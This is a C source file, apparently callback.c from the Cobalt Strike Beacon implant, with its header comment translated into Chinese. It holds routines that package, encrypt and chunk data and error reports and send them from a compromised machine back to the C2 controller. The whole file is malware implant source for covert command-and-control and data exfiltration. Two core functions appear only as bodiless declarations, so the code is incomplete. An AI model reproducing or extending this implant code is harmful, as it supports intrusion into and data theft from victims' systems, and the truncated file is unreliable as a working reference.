/* callback.c
 *
 * 此文件包含将数据发送回Cobalt Strike的例程（通过配置的C2通道）。
 * 所有这些函数都以command_shell_*开头。为什么？最初，Beacon只会返回
 * shell命令的输出。这个函数最初就是为了支持这个功能而构建的。即使
 * Beacon后来增加了更多功能，这个命名也一直保留了下来。
 *
 * Raphael是独自工作的，为什么这个文件有这么多注释？这是因为这些逻辑
 * 对Beacon的清洁和稳定运行至关重要。随着Beacon获得更多的C2方法，
 * 这些逻辑的复杂性可能会急剧增加。我更倾向于通过保持代码结构良好
 * 和易于理解来避免这种情况。这些注释是一种强制说明我采取这些步骤
 * 原因的方式。
 */
#include "channel.h"
#include "commands.h"
#include "security.h"
#include "beacon.h"
#include "link.h"
#include "build.h"
#include "parse.h"
#include "bformat.h"

/*
 * 此函数处理响应的打包和加密
 * 注意：调用者必须释放返回的指针
 * 注意：调用者必须释放返回的指针
 */
char * command_shell_encrypt(char * buffer, int length, int type, DWORD * result_len) {
	builder b;
	char * cipherdata;

	/* allocate our memory and do the right thing checking that we have it 
	 *
	 * Why length + 32 + HMAC_SIZE?
	 * - length is the length of the data we need to store.
	 * - 32b accounts for the package overheard managed by build_*
	 *   overhead: nonce, embedded length, type, etc. (12b-16b?)
	 *   additional 16b is for padding added by crypto algorithm. (I think)
	 * - HMAC_SIZE is the HMAC overhead added by security_encrypt
	 */
	cipherdata = (char *)malloc(length + 32 + HMAC_SIZE);
	if (cipherdata == NULL) {
		*result_len = 0;
		return NULL;
	}

	/* build up our encrypted data */
	build_init(&b, cipherdata, length + 32 + HMAC_SIZE);
	build_add_int(&b, type);
	build_add_data(&b, buffer, length);
	length = build_length(&b);

	/* something went terribly wrong, deal with it */
	if (length <= 0) {
		free(cipherdata);
		*result_len = 0;
		return NULL;
	}

	*result_len = security_encrypt(cipherdata, length);
	return cipherdata;
}

/*
 * This function accepts a response, its type, and a directive of whether or not
 * the data has to go out now (with no queuing). 
 *
 * The only channel to support queueing is HTTP post. 
 *
 * This function encrypts+packages the response, sends the response using the right
 * C2 option (propagating the sendNow/queueing argument if necessary), and it cleans
 * up after itself.
 *
 * I recommend keeping this logic in one function as command_shell_encrypt breaks
 * my own conventions for who is responsible for cleaning up a return value. By keeping
 * this logic in one function, we avoid the risk of a nasty memory leak in the C2.
 */
void command_shell_post(char * buffer, int length, int type, BOOL sendNow);

/* Step 3:
 * Welcome to the chunker! The chunker sends metadata which consists of
 * length, type, and chunk data in the remaining space. This is CALLBACK_CHUNK_ALLOCATE.
 *
 * It then sends several chunks via separate requests. This is CALLBACK_CHUNK_SEND.
 *
 * The allocate/send responses in the controller allocate a buffer, populate it, and then
 * process it once the expected input is received. These responses never need to be larger
 * than a chunk size.
 *
 * It is a goal of Cobalt Strike to have chunk + crypto overhead match the
 * length of metadata. This is the safest way to go as CS is well tested/exercised
 * for sending session metadata length chunks via Malleable C2.
 */
void command_shell_chunk(char * buffer, int length, int type) {
	int     chunk = setting_int(SETTING_C2_CHUNK_POST);
	int     sent = 0;
	formatp meta;

	/* initialize our metadata package */
	bformat_init(&meta, chunk * 2);
	bformat_int(&meta, length + 4);
	bformat_int(&meta, type);
	bformat_copy(&meta, buffer, chunk - 8);

	/* send some of our data with this initial package! */
	sent += chunk - 8;
	buffer += chunk - 8;

	/* build up a chunk with our total size and send it */
	command_shell_post(bformat_string(&meta), bformat_length(&meta), CALLBACK_CHUNK_ALLOCATE, TRUE);

	/* free our buffer! */
	bformat_free(&meta);

	/* OK, send our other chunks, plz */
	while (sent < length) {
		/* calculate what we're going to send this go around */
		int sz = length - sent;
		if (sz > chunk)
			sz = chunk;

		/* send our chunk */
		command_shell_post(buffer, sz, CALLBACK_CHUNK_SEND, TRUE);

		/* increment our buffer and data we've sent */
		buffer += sz;
		sent += sz;
	}
}

/* Step 2: To chunk or not to chunk?
 * If we're here, we're using chunked C2. Decide if the data to send fits
 * within a chunk. If it does: *send it immediately*.
 *
 * If it doesn't, then pass this on to the chunker for action. That's it.
 */
void command_shell_chunk_maybe(char * buffer, int blength, int type) {
	/* send to the chunker if our length is beyond the chunk size */
	if (blength > setting_int(SETTING_C2_CHUNK_POST)) {
		command_shell_chunk(buffer, blength, type);
	}
	/*
	 * post immediately if we're within the chunk size. The TRUE argument
	 * to command_shell_post tells CS to bypass any queueing the C2 method
	 * might do 
	 */
	else {
		command_shell_post(buffer, blength, type, TRUE);
	}
}

/* Step 1:
 * This is the entry point into our logic to post data back to the controller. 
 *
 * Check if we're using chunked C2 or not. If we are, pass it off to another function
 * to manage. Only POST_HTTP supports chunked C2 right now.
 *
 * If we are not using chunked C2, encrypt the data and post it using the normal means.
 * These means should allow collapsing multiple pieces of output into one request that
 * is sent later. This is why we set the fourth parameter to command_shell_post to FALSE.
 *
 * Refactoring note: it is imperative that the C2 post type always follow either the
 * chunking path OR the collapsing. These paths should NEVER mix/match for one post. 
 * Why? We don't want a situation where small data is queued into a response buffer and
 * larger chunks are split up assuming the response buffer is empty. Let's not go
 * there. The two code paths keeps this clear and easy to understand (for now?)
 */
void command_shell_callback(char * buffer, int length, int type);

/* post an error in an opsec-safe way */
void post_error_generic(int error, int arg1, int arg2, char * arg3) {
	formatp result;

	bformat_init(&result, 2048);
	bformat_int(&result, error);
	bformat_int(&result, arg1);
	bformat_int(&result, arg2);
	if (arg3 != NULL)
		bformat_copy(&result, arg3, strlen(arg3));

	command_shell_callback(bformat_string(&result), bformat_length(&result), CALLBACK_ERROR);

	bformat_free(&result);
}

void post_error_d(int error, int arg) {
	post_error_generic(error, arg, 0, NULL);
}

void post_error_s(int error, char * text) {
	post_error_generic(error, 0, 0, text);
}

void post_error_sd(int error, char * text, int arg) {
	post_error_generic(error, arg, 0, text);
}

void post_error_dd(int error, int arg1, int arg2) {
	post_error_generic(error, arg1, arg2, NULL);
}

void post_error_na(int error) {
	post_error_generic(error, 0, 0, NULL);
}

void post_error(int error, char * fmt, ...) {
	char buff[2048];

	va_list va;
	va_start(va, fmt);
	vsprintf_s(buff, 2048, fmt, va);
	va_end(va);

	post_error_generic(error, 0, 0, buff);
}

/* post a crypto replay error back to CS */
void post_crypt_replay_error(unsigned int diff) {
	unsigned int temp = htonl(diff);
	command_shell_callback((char *)&temp, sizeof(unsigned int), CALLBACK_POST_REPLAY_ERROR);
}
